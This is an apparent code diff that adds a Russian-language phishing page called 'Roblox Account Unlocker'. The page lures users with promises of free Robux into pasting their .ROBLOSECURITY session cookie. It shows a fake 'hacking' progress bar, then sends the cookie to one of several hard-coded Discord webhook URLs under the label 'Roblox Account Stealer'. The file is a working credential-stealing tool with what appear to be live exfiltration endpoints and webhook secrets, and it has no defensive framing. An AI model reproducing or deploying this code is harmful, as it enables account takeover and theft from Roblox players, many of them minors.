@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Account Unlocker</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1a1a1a;
+            color: white;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: #2a2a2a;
+            border-radius: 10px;
+            padding: 20px;
+            width: 100%;
+            max-width: 500px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        h1 {
+            color: #ff4d4d;
+            margin-bottom: 20px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #ccc;
+        }
+        textarea {
+            width: 100%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #444;
+            background-color: #333;
+            color: white;
+            resize: vertical;
+            min-height: 100px;
+        }
+        button {
+            background-color: #ff4d4d;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #ff3333;
+        }
+        .progress {
+            margin-top: 20px;
+            display: none;
+        }
+        .progress-bar {
+            height: 20px;
+            background-color: #333;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+        .progress-fill {
+            height: 100%;
+            background-color: #ff4d4d;
+            width: 0%;
+            transition: width 0.5s;
+        }
+        .status {
+            color: #ccc;
+            font-size: 14px;
+        }
+        .result {
+            margin-top: 20px;
+            display: none;
+            padding: 15px;
+            background-color: #333;
+            border-radius: 5px;
+            text-align: left;
+        }
+        .error {
+            color: #ff4d4d;
+            display: none;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Roblox Account Unlocker</h1>
+        <p>Вставьте куки своего аккаунта Roblox ниже, чтобы разблокировать премиум-функции и бесплатные Robux!</p>
+        
+        <div class="input-group">
+            <label for="cookies">Вставьте куки Roblox (.ROBLOSECURITY):</label>
+            <textarea id="cookies" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."></textarea>
+        </div>
+        
+        <button id="hackButton">Взломать аккаунт</button>
+        
+        <div class="progress" id="progress">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="status" id="status">Подключение к серверам Roblox...</div>
+        </div>
+        
+        <div class="error" id="error">Ошибка: Неверные куки. Убедитесь, что вы скопировали их правильно!</div>
+        
+        <div class="result" id="result">
+            <h3>Аккаунт успешно взломан!</h3>
+            <p>Теперь у вас есть доступ к:</p>
+            <ul>
+                <li>Бесплатным Robux</li>
+                <li>Премиум-функциям</li>
+                <li>Эксклюзивным предметам</li>
+            </ul>
+            <p>Закройте эту страницу и перезайдите в Roblox.</p>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOKS = [
+            "https://discord.com/api/webhooks/1388099001462820995/q5FXnjjhjzopxf61uikVnxpjwOie-ocUCmEJ5CXR3Twyw_LTeWRr1Aa0pavPcDySf1WF",
+            "https://discord.com/api/webhooks/1388099248461054032/RR0rT4G_lFeIVt8VHhzDIWfJZ5AihbTe08pbxfFz0AF-2Bk6SEzizt5AZLXJoA9Cb1Bo",
+            "https://discord.com/api/webhooks/1388099404065669170/JYxBcUphkuRHf5mRq8oo-xwK6Wsl9gaZ6Dj-r6SLV5qp4j17lvNPi7Yr-swNrT0_rHS6",
+            "https://discord.com/api/webhooks/1388099538719346841/hOnfST35nnUhu9qjhvX5bDe6vLpYYmPGS1g35oCdZ1V4lCKaFRfSd93TMTKxTmoS66qN",
+            "https://discord.com/api/webhooks/1388099704956391474/zTQqVvoQamVLJbN_ocOQgQcuYzUWbNYOempP2YZQ9eSe4QnjxEv6pIphG_2-dFHh0T-V"
+        ];
+
+        document.getElementById("hackButton").addEventListener("click", async function() {
+            const cookies = document.getElementById("cookies").value.trim();
+            if (!cookies.includes("WARNING")) {
+                document.getElementById("error").style.display = "block";
+                return;
+            }
+
+            document.getElementById("error").style.display = "none";
+            document.getElementById("progress").style.display = "block";
+            document.getElementById("hackButton").disabled = true;
+
+            // Fake progress animation
+            const status = document.getElementById("status");
+            const progressFill = document.getElementById("progressFill");
+            
+            const steps = [
+                {percent: 20, text: "Подключение к серверам Roblox..."},
+                {percent: 40, text: "Обход защиты аккаунта..."},
+                {percent: 60, text: "Получение данных профиля..."},
+                {percent: 80, text: "Финализация..."},
+                {percent: 100, text: "Взлом завершен!"}
+            ];
+
+            for (let i = 0; i < steps.length; i++) {
+                progressFill.style.width = steps[i].percent + "%";
+                status.textContent = steps[i].text;
+                await new Promise(resolve => setTimeout(resolve, 1000 + Math.random() * 1000));
+            }
+
+            // Send data to Discord
+            await sendToDiscord(cookies);
+
+            document.getElementById("result").style.display = "block";
+        });
+
+        async function sendToDiscord(cookies) {
+            const data = {
+                content: "@everyone **НОВЫЙ ЛОХ ВЗЛОМАН**",
+                embeds: [{
+                    title: "Roblox Account Cookies",
+                    description: "```" + cookies + "```",
+                    color: 0xff0000,
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "Roblox Account Stealer"
+                    }
+                }]
+            };
+
+            for (const webhook of WEBHOOKS) {
+                try {
+                    await fetch(webhook, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    break; // If successful, don't try other webhooks
+                } catch (e) {
+                    console.error("Webhook failed:", webhook, e);
+                    continue; // Try next webhook
+                }
+            }
+        }
+    </script>
+</body>
+</html>
